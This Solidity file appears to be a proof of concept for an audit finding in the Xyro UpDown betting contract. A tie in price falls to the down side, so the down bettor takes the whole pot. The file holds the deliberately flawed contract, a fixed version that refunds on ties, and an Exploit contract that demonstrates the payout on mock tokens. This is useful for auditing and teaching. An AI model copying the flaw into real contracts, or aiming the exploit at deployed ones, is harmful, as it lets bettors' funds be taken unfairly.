// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Xyro UpDown — Zokyo, 2024-08-29.
    finalizeGame pays the up side only when finalPrice/1e14 is strictly
    above startingPrice. An unchanged price falls into the else branch,
    so the down side is paid both stakes. 50 USDC from the up bettor is
    paid to the down bettor even though the price did not move.
*/

contract Token {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PriceOracle {
    uint256 public price;

    constructor(uint256 _price) {
        price = _price;
    }
}

contract Treasury {
    Token public token;

    constructor(Token _token) {
        token = _token;
    }

    function calculateUpDownRate(uint256 loserPool, uint256 winnerPool, uint256 feeBps)
        public
        pure
        returns (uint256)
    {
        require(winnerPool > 0, "winner");
        uint256 pot = loserPool + winnerPool;
        uint256 fee = (pot * feeBps) / 10000;
        return ((pot - fee) * 1e18) / winnerPool;
    }

    function distributeWithoutFee(uint256 rate, address user, uint256 depositAmount) external {
        uint256 payout = (depositAmount * rate) / 1e18;
        require(token.transfer(user, payout), "pay");
    }

    function refund(address user, uint256 amount) external {
        require(token.transfer(user, amount), "refund");
    }
}

contract UpDown {
    struct Game {
        uint192 startingPrice;
        uint256 totalDepositsUp;
        uint256 totalDepositsDown;
    }

    event UpDownFinalized(uint256 finalPrice, bool up, uint256 gameId);

    PriceOracle public oracle;
    Treasury public treasury;
    Token public token;
    Game internal _stored;
    uint256 public fee;
    uint256 public currentGameId = 1;
    address[] public upPlayers;
    address[] public downPlayers;
    mapping(address => uint256) public depositAmounts;

    constructor(PriceOracle _oracle, Treasury _treasury, Token _token) {
        oracle = _oracle;
        treasury = _treasury;
        token = _token;
        _stored.startingPrice = uint192(_oracle.price() / 1e14);
    }

    function startingPrice() external view returns (uint192) {
        return _stored.startingPrice;
    }

    function totalDepositsUp() external view returns (uint256) {
        return _stored.totalDepositsUp;
    }

    function totalDepositsDown() external view returns (uint256) {
        return _stored.totalDepositsDown;
    }

    function betUp(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(treasury), amount), "up");
        upPlayers.push(msg.sender);
        depositAmounts[msg.sender] += amount;
        _stored.totalDepositsUp += amount;
    }

    function betDown(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(treasury), amount), "down");
        downPlayers.push(msg.sender);
        depositAmounts[msg.sender] += amount;
        _stored.totalDepositsDown += amount;
    }

    function finalizeGame() external virtual {
        uint256 finalPrice = oracle.price();
        Game storage _game = _stored;
        // @> VULN: a tie fails the strict greater-than check, so down betters take the whole pot
        if (uint192(finalPrice / 1e14) > _game.startingPrice) {
            uint256 finalRate = treasury.calculateUpDownRate(_game.totalDepositsDown, _game.totalDepositsUp, fee);
            for (uint256 i = 0; i < upPlayers.length; i++) {
                treasury.distributeWithoutFee(finalRate, upPlayers[i], depositAmounts[upPlayers[i]]);
            }
            emit UpDownFinalized(finalPrice, true, currentGameId);
        } else {
            uint256 finalRate = treasury.calculateUpDownRate(_game.totalDepositsUp, _game.totalDepositsDown, fee);
            for (uint256 i = 0; i < downPlayers.length; i++) {
                treasury.distributeWithoutFee(finalRate, downPlayers[i], depositAmounts[downPlayers[i]]);
            }
            emit UpDownFinalized(finalPrice, false, currentGameId);
        }
    }
}

contract UpDownFixed is UpDown {
    constructor(PriceOracle _oracle, Treasury _treasury, Token _token) UpDown(_oracle, _treasury, _token) {}

    function finalizeGame() external override {
        uint256 finalPrice = oracle.price();
        uint192 scaled = uint192(finalPrice / 1e14);
        if (scaled > _stored.startingPrice) {
            uint256 finalRate =
                treasury.calculateUpDownRate(_stored.totalDepositsDown, _stored.totalDepositsUp, fee);
            for (uint256 i = 0; i < upPlayers.length; i++) {
                treasury.distributeWithoutFee(finalRate, upPlayers[i], depositAmounts[upPlayers[i]]);
            }
        } else if (scaled < _stored.startingPrice) {
            uint256 finalRate =
                treasury.calculateUpDownRate(_stored.totalDepositsUp, _stored.totalDepositsDown, fee);
            for (uint256 i = 0; i < downPlayers.length; i++) {
                treasury.distributeWithoutFee(finalRate, downPlayers[i], depositAmounts[downPlayers[i]]);
            }
        } else {
            for (uint256 i = 0; i < upPlayers.length; i++) {
                treasury.refund(upPlayers[i], depositAmounts[upPlayers[i]]);
            }
            for (uint256 i = 0; i < downPlayers.length; i++) {
                treasury.refund(downPlayers[i], depositAmounts[downPlayers[i]]);
            }
        }
    }
}

contract UpBettor {
    function bet(Token token, UpDown game, uint256 amount) external {
        token.approve(address(game), amount);
        game.betUp(amount);
    }
}

contract Exploit {
    Token public token;
    PriceOracle public oracle;
    Treasury public treasury;
    UpDown public game;
    UpBettor public up;
    uint256 public scaledFinal;
    uint256 public scaledStart;
    uint256 public downGot;
    uint256 public upGot;

    constructor() {
        token = new Token();
        oracle = new PriceOracle(1000 ether);
        treasury = new Treasury(token);
        game = new UpDown(oracle, treasury, token);
        up = new UpBettor();
        token.mint(address(up), 50 ether);
        token.mint(address(this), 50 ether);
        up.bet(token, game, 50 ether);
        token.approve(address(game), 50 ether);
        game.betDown(50 ether);
    }

    function run() external {
        scaledFinal = oracle.price() / 1e14;
        scaledStart = game.startingPrice();
        require(scaledFinal == scaledStart, "tie");
        uint256 upBefore = token.balanceOf(address(up));
        game.finalizeGame();
        downGot = token.balanceOf(address(this));
        upGot = token.balanceOf(address(up));
        require(upBefore == 0, "up before");
        require(upGot == 0, "up paid");
        require(downGot == 100 ether, "down took pot");
        require(token.balanceOf(address(treasury)) == 0, "treasury");
    }
}
